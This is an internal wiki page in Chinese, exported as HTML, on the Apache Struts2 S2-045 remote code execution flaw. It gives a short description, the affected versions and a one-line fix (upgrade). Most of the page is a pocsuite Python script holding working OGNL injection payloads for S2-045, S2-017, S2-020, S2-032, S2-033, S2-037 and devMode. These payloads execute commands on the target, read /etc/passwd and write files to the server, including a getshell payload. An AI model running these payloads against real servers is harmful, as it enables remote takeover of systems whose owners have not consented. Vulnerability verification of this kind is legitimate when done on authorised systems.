                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <p><br /></p><h1><span>一. 漏洞简介</span></h1><p><span><span>漏洞描述：</span></span></p><p>Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。</p><p>实际上在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell（另外原本其实也有第三种选择cos）。其中的jakarta解析器是Struts 2框架的标准组成部分。<span>默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。</span></p><p><span style="color: rgb(26,26,26);"><span>漏洞评级：严重</span></span></p><p><span style="color: rgb(38,38,38);"><span>参考连接：</span></span></p><p><span style="color: rgb(38,38,38);"><span><a href="http://www.freebuf.com/vuls/128668.html">http://www.freebuf.com/vuls/128668.html</a></span></span></p><p><a href="https://blog.csdn.net/zhangzeyuaaa/article/details/53676073">https://blog.csdn.net/zhangzeyuaaa/article/details/53676073</a></p><h1>二. 利用条件</h1><p>Struts 2.3.5 – Struts 2.3.31</p><p>Struts 2.5 – Struts 2.5.10</p><h1>三. 漏洞验证</h1><p><span style="color: rgb(51,51,51);">Struts2的核心是使用的webwork框架,处理 action时通过调用底层的getter/setter方法来处理http的参数,它将每个http参数声明为一个ONGL(这里是ONGL的介绍)语句。当我们提交一个http参数:</span><br /><span style="color: rgb(51,51,51);">?user.address.city=Bishkek&amp;user['favoriteDrink']=kumys </span><br /><span style="color: rgb(51,51,51);">ONGL将它转换为:</span><br /><span style="color: rgb(51,51,51);">action.getUser().getAddress().setCity(&quot;Bishkek&quot;) </span><br /><span style="color: rgb(51,51,51);">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br /><span style="color: rgb(51,51,51);">这是通过ParametersInterceptor(参数过滤器)来执行的,使用用户提供的HTTP参数调用 ValueStack.setValue()。</span><br /><span style="color: rgb(51,51,51);">为了防范篡改服务器端对象,XWork的ParametersInterceptor不允许参数名中出现“#”字符,但如果使用了Java的 unicode字符串表示\u0023,攻击者就可以绕过保护,修改保护Java方式执行的值</span></p><h1>四. 漏洞利用</h1><p><br /></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="df0993bb-4554-43db-826d-11503586297c" data-macro-parameters="language=py" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#这里存放代码
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

#解决UnicodeEncodeError: 'ascii' codec can't encode characters in position 7563-7566:
# ordinal not in range(128)

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

class Strust2POC(POCBase):
    vulID = '5'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-03-07' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-03-07'# 编写 PoC 的日期
    updateDate = '2017-03-07'# PoC 更新的时间,默认和编写时间一样
    references = 'http://mp.weixin.qq.com/s/n_AzKCN6oMwAMRSxDi4QBw'# 漏洞地址来源,0day不用写
    name = 'Strust2 Coder execution'# PoC 名称
    appPowerLink = 'http://struts.apache.org/'# 漏洞厂商主页地址
    appName = 'Strust2'# 漏洞应用名称
    appVersion = 'Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10'# 漏洞影响版本
    vulType = 'code-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Struts 代码执行漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 5-Strust2-getshell.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}        
        #获取漏洞url
        vul_url = '%s' % self.url
        url = vul_url
        #print url
        #self.strust2_devmode(url)
        #exit()
        try:
            #判断多个漏洞,s2_045
            s2_045 = self.strust2_045(url)
            if s2_045:
                result = s2_045
                return self.save_output(result)
            """
            #判断s2_017
            s2_017 = self.strust2_017(url)
            if s2_017:
                result = s2_017
                return self.save_output(result)
            #判断s2_020
            s2_020 = self.strust2_020(url)
            if s2_020:
                result = s2_020
                return self.save_output(result)
            #判断s2_032
            s2_032 = self.strust2_032(url)
            if s2_032:
                result = s2_032
                return self.save_output(result)
            #判断s2_033
            s2_033 = self.strust2_033(url)
            if s2_033:
                result = s2_033
                return self.save_output(result)
            #判断s2_037
            s2_037 = self.strust2_037(url)
            if s2_037:
                result = s2_037
                return self.save_output(result)
            #判断strust2_devmode
            s2_devmode = self.strust2_devmode(url)
            if s2_devmode:
                result = s2_devmode
                return self.save_output(result)
            #
            """
            #如果没有漏洞 result = {}
            return self.save_output(result)
        except Exception,e:
            #print "error!"
            result = {}
        

    def strust2_045(self,url):
        result = {}
        send_payload = {
        "User-Agent":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
        "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        "Content-Length":"155",
        }
        data = '--447635f88b584ab6b8d9c17d04d79918\
        Content-Disposition: form-data; name="image1"\
        Content-Type: text/plain; charset=utf-8\
        \
        x\
        --447635f88b584ab6b8d9c17d04d79918--'
        r = req.post(url=url,data=data,headers=send_payload)
        if (r.status_code) == 200 and (len(r.text)&lt;100):
            #print u"存在漏洞"
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Payload'] = send_payload['Content-Type']
            result['VerifyInfo']['whoami'] = r.text + "strust2_045"
        else:
            result = {} 
        return result

    def strust2_017(self,url):
        import urlparse
        arr_url = urlparse.urlparse(url)
        #取得URL
        url = arr_url[0]+"://"+arr_url[1]+arr_url[2]+arr_url[3]
        #print url
        send_payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami',''})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        r = req.get(url=url+send_payload)
        if (r.status_code) == 200 and (len(r.text)&lt;100):
            #print u"存在漏洞"
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Payload'] = send_payload
            result['VerifyInfo']['whoami'] = r.text + "strust2_017"
        else:
            result = {} 
        return result   

    def strust2_020(self,url):
        from urlparse import urlparse, urlunparse, urljoin
        import time
        """
        # POC Name : Struts2 S2-020漏洞检测POC
        # Author      : CF_HB
        # Date        : 2016/06/02
        # Refere      : http://drops.wooyun.org/papers/1377
        #用法: python S2-020_POC.py -url http://121.42.xxx.xxx:8081/xxx/xxx.action
        #POC适用范围: Tomcat6.x,Tomcat7.x,Tomcat8.x 更低的5.x，4.x没有测试环境#
        结果：
        存在漏洞：
            [Congratulations!!!]
            http://121.42.xxx.xxx:8081/xxx/xxx.action is vulnerable S2-020.
            浏览器访问验证-Windows目标：http://121.42.xxx.xxx:8081/xxx/S2020/explorer.exe
            浏览器访问验证-Linux目标：http://121.42.xxx.xxx:8081/xxx//S2020/etc/passwd
        不存在漏洞:
            [sorry!!]
            http://www.csu.wsu.cn/index.php is no vulnerable..
        """
        result = {}
        urlinfo = urlparse(url)
        tom8_check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/', '', '', ''))
        tom6x7x_url_two = urlunparse((urlinfo.scheme, urlinfo.netloc, urlinfo.path.split('/')[1], '', '', ''))
        #print u"网址",tom8_check_url,u"目录",tom6x7x_url_two
        headers = {
            'Host': urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': url,
            'banner': 's2-020 poc from cf_hb.'
           }
        poc_tom8 = []
        poc_win_tom6x7x = []
        poc_linux_tom6x7x = []
        # Tomcat 8.x Linux+Windows
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.prefix=S2020POC")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1")
        poc_tom8.append('?poc=&lt;%out.write("This_Site_Is_Vulnerable_S2020");%>')
        # Tomcat6.x and Tomcat 7.x - Windows
        poc_win_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=C://Windows/")
        # Tomcat6.x and Tomcat 7.x - Linux
        poc_linux_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=/")
        # verify
        try:
            for poc_add in poc_tom8:
                poc_url = urljoin(url, poc_add)
                resp = req.get(url=poc_url, headers=headers, timeout=3)
                time.sleep(1)
            checkurl = urljoin(tom8_check_url, "S2020POC1.jsp")
            # tomcat写日志难以捉摸,为了避免漏掉，测试5次每次停顿1秒
            # check 5 times
            for i in range(0, 5):
                resp = req.get(checkurl, headers=headers, timeout=3)
                time.sleep(1)
                if resp.status_code and "This_Site_Is_Vulnerable_S2020" in resp.content:
                    #print "[Congratulations!!!]"
                    #print "{url} is vulnerable S2-020.".format(url=self.url)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Payload'] = poc_tom8[0]
                    result['VerifyInfo']['whoami'] = checkurl + ",os:linux" + "strust2_020"
                    return result

            # Check tomcat6.x and tomcat7.x - Windows
            for poc_add in poc_win_tom6x7x:
                poc_url = urljoin(url, poc_add)
                resp = req.get(poc_url, headers=headers, timeout=3)
                time.sleep(1)
                checkurl = tom6x7x_url_two+"/S2020/explorer.exe"
                resp = req.head(checkurl, timeout=3)
                if resp.status_code == 200:
                    size = resp.headers.get('Content-Length')
                    fsize = int(size) / 1024
                    if fsize > 1:    #检测文件大小是否大于1KB
                        #print "[Congratulations!!!!!]"
                        #print "{url} is vulnerable S2-020.".format(url=self.url)
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = url
                        result['VerifyInfo']['Payload'] = poc_add
                        result['VerifyInfo']['whoami'] = checkurl + ",os:windows" + ",os:linux" + "strust2_020"
                        return result                        

            # Check tomcat6.x and tomcat7.x - Linux
            for poc_add in poc_linux_tom6x7x:
                poc_url = urljoin(url, poc_add)
                resp = req.get(poc_url, headers=headers, timeout=3)
                time.sleep(1)
                checkurl = tom6x7x_url_two+"/S2020/etc/passwd"
                resp = req.get(checkurl, headers=headers, timeout=3)
                if resp.status_code and ("/bin/bash" in resp.content or "root:x:0:0:root:/root" in resp.content):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Payload'] = poc_add
                    result['VerifyInfo']['whoami'] = checkurl + ",os:linux" + "strust2_020"
                    return result   
            #print "[sorry!!]"
            #print "{url} is no vulnerable..".format(url=self.url)
            return result 
        except Exception, e:
            #print "Failed to connection target, try again.."
            return result

    def strust2_032(self,url): 
        import sys,re
        from urlparse import urljoin
        result = {}
        '''    S2-032辅助工具V1.0
        #    Author: CF_HB
        #    CreatedTime: 2016-04-28
        #    漏洞编号:(CVE-2016-3081)
        #V1.0功能说明:
        #     1) 漏洞检查
        #     2) 漏洞命令执行
        #     3) POC和EXP可以自定义添加
        #     4) 暂只支持GET方式提交payload
        #To Do:
        #     1) 支持POST类型提交
        #     2) 支持IP+PORT(http://114.114.114.114:8080/)类型的自动化检测
        #     3) 随时补充POC和EXP
        #用法说明如下:
        #     1) 检查目标是否存在S2-032漏洞用法
        #     usage: python S2032.py http://www.test.com/login.action check
        #     2) 一句话命令执行
        #     usage: python S2032.py http://www.test.com/login.action "net user"
        #     3) 交互式命令执行(反弹shell下，或者终端下面使用.)
        #     usage: python S2032.py http://www.test.com/login.action cmdtool
        #####声明:
        #       本脚本仅用于安全测试，请勿用于违法犯罪!
        '''
        S2032POC = []
        # POC集合
        # 在POC的判断点替换成：This_site_has_s2-032_vulnerabilities
        S2032POC.append("?test=This_site_has_s2-032_vulnerabilities&amp;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.test,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close")
        S2032POC.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&amp;command=echo  This_site_has_s2-032_vulnerabilities")

        S2032EXP = []

        # command_exp集合
        # 新的EXP在执行命令的点设置为:GiveMeCommand,然后像下面的方式添加即可
        # nsf_exp
        S2032EXP.append("?method:%23_memberAccess%3d%40ognl%2eOgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java%2elang%2eRuntime%40getRuntime%28%29%2eexec%28%23parameters.command[0]%29%2egetInputStream%28%29%2c%23b%3dnew%20java%2eio%2eInputStreamReader%28%23a%29%2c%23c%3dnew%20java%2eio%2eBufferedReader%28%23b%29%2c%23d%3dnew%20char%5b40960%5d%2c%23c%2eread%28%23d%29%2c%23kxlzx%3d%40org%2eapache%2estruts2%2eServletActionContext%40getResponse%28%29%2egetWriter%28%29%2c%23kxlzx%2eprintln%28%23d%29%2c%23kxlzx%2eclose&amp;command=GiveMeCommand")
        # shack2_exp
        S2032EXP.append("?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=GiveMeCommand&amp;pp=\\\\A&amp;ppp=%20&amp;encoding=UTF-8")
        S2032EXP.append("?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;name=allowStaticMethodAccess&amp;name1=allowPrivateAccess&amp;name2=excludedPackageNamePatterns&amp;name3=excludedClasses&amp;cmd=GiveMeCommand&amp;pp=\\\\AAAA&amp;ppp=%20&amp;encoding=UTF-8 ")
        # 用于鉴别EXP是否成功利用的错误关键字
        Error_Message = [r'&lt;/[^>]+>', r'Error report', r'Apache Tomcat', r'memberAccess', r'ServletActionContext']
        hashKey = "This_site_has_s2-032_vulnerabilities"

        try:
            for poc in S2032POC:
                targetURL = urljoin(url, poc) #url+poc
                #print targetURL
                res = req.get(targetURL, timeout=3)
                resulttext = res.text.encode("utf-8").strip().strip('\x00')
                if hashKey in resulttext:
                    #print u"存在漏洞"
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Payload'] = targetURL + "strust2_032"
                    return result                      
            #print u"不存在漏洞"
            return result
        except Exception, e:
            #print "something error!!",e
            return result

    def strust2_033(self,url): 
        from urlparse import urljoin
        result = {}
        # S2-033 POC
        # Author: CF_HB
        # 时间：2016年6月6日
        # 漏洞编号：CVE-2016-3087 (S2-033)
        # 漏洞详情：http://blog.nsfocus.net/apache-struts2-vulnerability-technical-analysis-protection-scheme-s2-033/
        s2033_poc = "?%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908"
        s2033_exp = "?%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami"
        try:
            poc_url = urljoin(url,s2033_poc)
            #print poc_url
            s = req.session()
            res = s.post(poc_url, timeout=4)
            if res.status_code == 200 and "290860253718" == res.content:
                #print "{url} is vulnerable S2-033.".format(url=url)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = poc_url + "strust2_033"
                return result     
            else:
                #print "{url} is not vulnerable..".format(url=url)
                return result 
        except Exception, e:
            #print "Failed to connection target, try again.."
            return result 

    def strust2_037(self,url): 
        from urlparse import urljoin
        result = {}
        # S2-037 POC
        # Author:CF_HB
        # 时间：2016年6月15日
        s2037_poc = "?%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=25F9E794323B453885F5181F1B624D0B"
        s2037_exp = "?(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=whoami"
        try:
            poc_url = urljoin(url,s2037_poc)
            #print poc_url
            s = req.session()
            res = s.post(poc_url, timeout=4)
            if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" == res.content:
                #print "{url} is vulnerable S2-033.".format(url=url)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = s2037_poc + "strust2_037"
                return result     
            else:
                #print "{url} is not vulnerable..".format(url=url)
                return result 
        except Exception, e:
            #print "Failed to connection target, try again.."
            return result 

    def strust2_devmode(self,url):
        from urlparse import urljoin
        result = {}
        #devMode模式漏洞
        data_dev = "debug=command&amp;expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=tests"
        #debug=command&amp;expression=(#wr=#context[#parameters.obj[0]].getWriter())!=(#wr.println(#parameters.content[0]))!=(#wr.flush())!=(#wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=tests

        #返回当前路径
        data_src = "debug=browser&amp;object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.content[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;reqobj=%2f&amp;reqobj=111&amp;content="
        #"debug=browser&amp;object=(#mem=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),#a=#parameters.reqobj[0],#c=#parameters.reqobj[1],#req=#context.get(#a),#b=#req.getRealPath(#c),#hh=#context.get(#parameters.rpsobj[0]),#hh.getWriter().println(#parameters.content[0]),#hh.getWriter().println(#b),#hh.getWriter().flush(),#hh.getWriter().close(),1?#xx:#request.toString&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;reqobj=/&amp;reqobj=111&amp;content=devMode dir--***"

        #getshell
        data_shell = "debug=browser&amp;object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23parameters.reqobj[1],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.reqobj[2]),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;reqobj=shellPath&amp;reqobj=OK&amp;content=hacker"
        #data_exec = "debug=browser&amp;object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23parameters.reqobj[1],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.reqobj[2]),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;reqobj=C:%5cJspStudy%5ctomcat2%5cwebapps%5cstruts2-blank%5chack.txt&amp;reqobj=OK&amp;content=hacker"
        
        try:
            poc_url = urljoin(url,data_dev)
            #print poc_url
            s = req.session()
            res = s.post(poc_url, timeout=4)
            if res.status_code == 200 and "tests" == res.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = poc_url + "strust2_devmode"
                return result     
            else:
                #print "{url} is not vulnerable..".format(url=url)
                return result 
        except Exception, e:
            #print "Failed to connection target, try again.."
            return result         

    def _attack(self):
        result = {}
        # 攻击代码
        # 
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
            #生产报告错误，在这里记得
            data = result['VerifyInfo']['URL'] + result['VerifyInfo']['whoami'] + "\n"
            with open('result.txt','a+') as f:
                f.write(str(data))

        else:
            output.fail()
        return output

register(Strust2POC)



</pre></td></tr></table><p><br /></p><h1>五. 解决方案</h1><p>升级到最新版</p><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><br /></span></pre><p><br /></p><pre class="prettyprint lang-html prettyprinted"><br /></pre>
        <p>&nbsp;</p>
    </body>
</html>
